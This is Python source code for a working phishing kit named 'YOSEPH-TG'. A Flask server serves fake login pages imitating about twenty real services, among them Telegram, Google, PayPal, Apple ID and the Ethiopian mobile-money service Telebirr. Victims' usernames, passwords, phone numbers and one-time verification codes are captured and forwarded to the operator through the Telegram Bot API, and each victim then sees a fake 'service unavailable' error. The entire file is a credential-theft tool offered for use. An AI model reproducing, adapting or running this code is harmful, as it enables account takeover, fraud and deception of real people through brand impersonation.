import os, requests, sys, base64, time, datetime, json
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# --- Configuration & Branding ---
CONFIG_FILE = "config.txt"
TOOL_NAME = "YOSEPH-TG"
POWERED_BY = "Powered by Yoseph Alganeh"
# Access Password: @Yosephalganeh44 (Base64 Encoded)
ENCODED_PASS = "QFlvc2VwaGFsZ2FuZWg0NA==" 

# --- Professional Platform Database (25+ Targets) ---
TEMPLATES = {
    "1": {"name": "Telegram", "color": "#0088cc", "logo": "https://telegram.org/img/t_logo.png", "type": "phone", "desc": "Log in to your Telegram account via phone number."},
    "2": {"name": "Facebook", "color": "#1877f2", "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg", "type": "login", "desc": "Connect with friends and the world around you."},
    "3": {"name": "Instagram", "color": "linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888)", "logo": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg", "type": "login", "desc": "Sign in to see photos and videos from your friends."},
    "4": {"name": "Google", "color": "#4285f4", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg", "type": "login", "desc": "Use your Google Account to continue."},
    "5": {"name": "TikTok", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg", "type": "login", "desc": "Make Your Day. Sign in to your TikTok account."},
    "6": {"name": "WhatsApp", "color": "#25d366", "logo": "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg", "type": "phone", "desc": "Verify your WhatsApp account to start messaging."},
    "7": {"name": "Snapchat", "color": "#fffc00", "logo": "https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg", "type": "login", "text": "black", "desc": "Log in to Snapchat to share the moment."},
    "8": {"name": "Netflix", "color": "#e50914", "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg", "type": "login", "desc": "Sign in to watch movies and TV shows anytime."},
    "9": {"name": "Spotify", "color": "#1db954", "logo": "https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg", "type": "login", "desc": "Listening is everything. Log in to Spotify."},
    "10": {"name": "PayPal", "color": "#003087", "logo": "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg", "type": "login", "desc": "Log in to your PayPal account to send money."},
    "11": {"name": "LinkedIn", "color": "#0077b5", "logo": "https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png", "type": "login", "desc": "Welcome to your professional community."},
    "12": {"name": "Twitter/X", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/commons/5/57/X_logo_2023_(white).svg", "type": "login", "desc": "Log in to see what's happening now."},
    "13": {"name": "GitHub", "color": "#24292e", "logo": "https://upload.wikimedia.org/wikipedia/commons/9/91/Octicons-mark-github.svg", "type": "login", "desc": "Sign in to the world's leading software platform."},
    "14": {"name": "Amazon", "color": "#232f3e", "logo": "https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg", "type": "login", "desc": "Sign in to your Amazon account for shopping."},
    "15": {"name": "Steam", "color": "#171a21", "logo": "https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg", "type": "login", "desc": "Sign in to Steam to play games and more."},
    "16": {"name": "Telebirr", "color": "#00a9e0", "logo": "https://upload.wikimedia.org/wikipedia/en/thumb/5/5f/Telebirr_logo.png/220px-Telebirr_logo.png", "type": "phone", "desc": "Log in to your Telebirr account safely."},
    "17": {"name": "Discord", "color": "#5865f2", "logo": "https://upload.wikimedia.org/wikipedia/commons/7/73/Discord_Color_Text_Logo.svg", "type": "login", "desc": "Your place to talk. Log in to your Discord."},
    "18": {"name": "Reddit", "color": "#ff4500", "logo": "https://upload.wikimedia.org/wikipedia/commons/5/58/Reddit_logo_new.svg", "type": "login", "desc": "The front page of the internet. Sign in."},
    "19": {"name": "Apple ID", "color": "#000000", "logo": "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg", "type": "login", "desc": "Sign in with your Apple ID to manage services."},
    "20": {"name": "Microsoft", "color": "#00a4ef", "logo": "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg", "type": "login", "desc": "Sign in to your Microsoft account (Outlook, Office)."}
}

def clear(): os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""\033[96m
 ╔═════════════════════════════════════════════════════════════╗
 ║  \033[93m█▄─█─▄█─▄▄─█─▄▄▄─█▄─▄▄─█─█─█─▀█▄─▄▄─█\033[96m                ║
 ║  \033[93m─█─▀─██─█─║█─█─▄█─█─█─║█─█─█──█─█─║█\033[96m                ║
 ║  \033[93m─▀───▀▀▄▄▀▀▀▄▄▄▀▀▄▄▀▀▀▀▀▀▀▀▀──▀▄▄▀▀▀\033[96m                ║
 ╠═════════════════════════════════════════════════════════════╣
 ║  \033[97mSTATUS    : \033[92mPremium Unlocked\033[96m                               ║
 ║  \033[97mDEVELOPER : \033[93m@Yosephalganeh44\033[96m                               ║
 ║  \033[97mCREDITS   : \033[92m{POWERED_BY}\033[96m                       ║
 ╚═════════════════════════════════════════════════════════════╝\033[0m""")

def check_access():
    clear(); banner()
    pwd = input("\033[93m[?] Enter Access Password: \033[0m").strip()
    if pwd != base64.b64decode(ENCODED_PASS).decode():
        print("\033[91m[!] Unauthorized Access! Connection Terminated.\033[0m"); sys.exit()
    print("\033[92m[+] Identity Verified. Welcome Yoseph.\033[0m")
    time.sleep(1)

def get_bot_config():
    if not os.path.exists(CONFIG_FILE):
        print("\n\033[95m[*] First Time Setup - Telegram Bot\033[0m")
        token = input("\033[93m[?] Enter Bot Token: \033[0m").strip()
        chat_id = input("\033[93m[?] Enter Chat ID: \033[0m").strip()
        with open(CONFIG_FILE, "w") as f: f.write(f"{token}\n{chat_id}")
        return token, chat_id
    with open(CONFIG_FILE, "r") as f:
        data = f.read().splitlines()
        return data[0], data[1]

def select_platform():
    global SELECTED_PLATFORM
    clear(); banner()
    print("\033[95m  [ TARGET PLATFORM SELECTION ]\033[0m")
    print("\033[90m  ---------------------------------------------\033[0m")
    items = list(TEMPLATES.items())
    for i in range(0, len(items), 2):
        k1, v1 = items[i]
        line = f"  [\033[92m{k1}\033[0m] \033[97m{v1['name']:<15}\033[0m"
        if i+1 < len(items):
            k2, v2 = items[i+1]
            line += f"  [\033[92m{k2}\033[0m] \033[97m{v2['name']:<15}\033[0m"
        print(line)
    
    print("\n\033[91m  [0] Exit Framework\033[0m")
    choice = input("\n\033[93m[YOSEPH-TG] > \033[0m").strip()
    if choice == '0': sys.exit()
    if choice in TEMPLATES:
        SELECTED_PLATFORM = TEMPLATES[choice]
        print(f"\n\033[92m[*] Initializing {SELECTED_PLATFORM['name']} Server...\033[0m")
        time.sleep(1.5)
    else: select_platform()

# --- Ultra-Premium HTML Template with CSS Animations ---
HTML_CORE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login | {{ name }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes fadeInScale { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .page-container { animation: fadeInScale 0.7s ease-out; }
        .input-anim { animation: slideUp 0.5s ease-out backwards; }
        .btn-glow:hover { box-shadow: 0 0 15px {{ color }}88; }
        body { background: radial-gradient(circle at center, #ffffff 0%, #f1f5f9 100%); }
    </style>
</head>
<body class="flex justify-center items-center min-h-screen p-5">
    <div class="bg-white p-10 rounded-[2.5rem] shadow-[0_25px_70px_rgba(0,0,0,0.07)] w-full max-w-sm border border-slate-100 page-container">
        <div class="text-center mb-10">
            <img src="{{ logo }}" class="h-20 w-20 mx-auto object-contain mb-6 drop-shadow-sm">
            <h1 id="title" class="text-3xl font-black text-slate-800 tracking-tight">{{ name }}</h1>
            <p id="description" class="text-slate-400 text-sm mt-3 px-2 leading-relaxed">{{ desc }}</p>
        </div>

        <div id="auth-form" class="space-y-5">
            {% if type == 'phone' %}
                <div class="input-anim" style="animation-delay: 0.1s">
                    <input type="tel" id="user_field" placeholder="Phone Number (+251...)" 
                    class="w-full p-5 bg-slate-50 border-2 border-slate-100 rounded-2xl outline-none focus:border-{{ color }} focus:bg-white transition-all text-lg">
                </div>
                <button onclick="handleNextStep()" style="background: {{ color }}; color: {{ text_color|default('white') }}" 
                class="w-full p-5 font-bold rounded-2xl shadow-xl btn-glow transition-all active:scale-95 input-anim" style="animation-delay: 0.2s">NEXT</button>
            {% else %}
                <div class="input-anim" style="animation-delay: 0.1s">
                    <input type="text" id="user_field" placeholder="Email or Username" 
                    class="w-full p-5 bg-slate-50 border-2 border-slate-100 rounded-2xl outline-none focus:border-blue-500 focus:bg-white transition-all">
                </div>
                <div class="input-anim" style="animation-delay: 0.2s">
                    <input type="password" id="pass_field" placeholder="Password" 
                    class="w-full p-5 bg-slate-50 border-2 border-slate-100 rounded-2xl outline-none focus:border-blue-500 focus:bg-white transition-all">
                </div>
                <button onclick="submitData()" style="background: {{ color }}; color: {{ text_color|default('white') }}" 
                class="w-full p-5 font-bold rounded-2xl shadow-xl btn-glow transition-all active:scale-95 input-anim" style="animation-delay: 0.3s">LOG IN</button>
            {% endif %}
        </div>

        <div id="loader" class="hidden py-10 text-center">
            <div class="inline-block w-10 h-10 border-[4px] border-slate-100 border-t-{{ color }} rounded-full animate-spin"></div>
            <p class="text-[10px] font-black text-slate-300 mt-4 tracking-[0.2em] uppercase">Encrypting Connection</p>
        </div>

        <p id="status-text" class="text-center mt-8 text-sm font-bold text-red-500 min-h-[1.25rem]"></p>
        
        <div class="mt-12 pt-8 border-t border-slate-50 flex justify-between items-center text-[10px] text-slate-300 font-black uppercase tracking-widest">
            <span>Security v4.1</span>
            <span>&copy; {{ name }} 2026</span>
        </div>
    </div>

    <script>
        let storedUser = "";

        async function handleNextStep() {
            storedUser = document.getElementById('user_field').value;
            if (storedUser.length < 8) { showError("Please enter a valid phone number"); return; }
            
            showLoader(true);
            await sendLog(storedUser, "[STEP 1: PHONE CAPTURED]");

            setTimeout(() => {
                showLoader(false);
                document.getElementById('title').innerText = "Verify Identity";
                document.getElementById('description').innerText = "We've sent a code to your {{ name }} app. Please enter it below.";
                document.getElementById('auth-form').innerHTML = `
                    <div class="input-anim">
                        <input type="number" id="pass_field" placeholder="00000" 
                        class="w-full p-5 bg-slate-50 border-2 border-slate-100 rounded-2xl outline-none text-center text-3xl font-black tracking-[0.5em]">
                    </div>
                    <button onclick="submitData()" style="background: {{ color }}; color: {{ text_color|default('white') }}" 
                    class="w-full p-5 font-bold rounded-2xl shadow-xl btn-glow transition-all">VERIFY</button>
                `;
            }, 1500);
        }

        async function submitData() {
            let u = storedUser || document.getElementById('user_field').value;
            let p = document.getElementById('pass_field').value;
            if (p.length < 4) { showError("Invalid credentials. Try again."); return; }
            
            showLoader(true);
            await sendLog(u, p);
            
            setTimeout(() => {
                showLoader(false);
                showError("The service is temporarily unavailable. Please try again later.");
            }, 3000);
        }

        async function sendLog(u, p) {
            try {
                await fetch('/submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u: u, p: p})
                });
            } catch (e) { console.log(e); }
        }

        function showLoader(state) {
            document.getElementById('auth-form').classList.toggle('hidden', state);
            document.getElementById('loader').classList.toggle('hidden', !state);
            document.getElementById('status-text').innerText = "";
        }

        function showError(msg) {
            document.getElementById('status-text').innerText = msg;
        }
    </script>
</body>
</html>
"""

# --- Flask Server Logic ---
@app.route('/')
def index():
    return render_template_string(HTML_CORE, 
        name=SELECTED_PLATFORM['name'], 
        color=SELECTED_PLATFORM['color'], 
        logo=SELECTED_PLATFORM['logo'], 
        type=SELECTED_PLATFORM['type'],
        desc=SELECTED_PLATFORM['desc'],
        text_color=SELECTED_PLATFORM.get('text', 'white')
    )

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_msg = f"🔔 *YOSEPH-TG - SUCCESSFUL CAPTURE*\n" \
              f"━━━━━━━━━━━━━━━━━━━━━━━━\n" \
              f"👤 *Target App:* `{SELECTED_PLATFORM['name']}`\n" \
              f"📧 *Login/Phone:* `{data['u']}`\n" \
              f"🔑 *Password/Code:* `{data['p']}`\n" \
              f"━━━━━━━━━━━━━━━━━━━━━━━━\n" \
              f"🕒 *Time:* `{timestamp}`\n" \
              f"📍 *Branding:* `{POWERED_BY}`" #
    
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={"chat_id": CHAT_ID, "text": log_msg, "parse_mode": "Markdown"})
    except Exception as e:
        print(f"\033[91m[!] Error sending to Bot: {e}\033[0m")
        
    return jsonify({"status": "success"})

if __name__ == '__main__':
    check_access()
    BOT_TOKEN, CHAT_ID = get_bot_config()
    select_platform()
    
    print(f"\n\033[94m[*] Server Live At : http://127.0.0.1:5000\033[0m")
    print(f"\033[94m[*] Powered by     : Yoseph Alganeh\033[0m") #
    print(f"\033[90m[*] Press Ctrl+C to stop the framework.\033[0m\n")
    
    # Running Flask on mobile IDE (Pydroid/Termux)
    app.run(host='0.0.0.0', port=5000, debug=False)
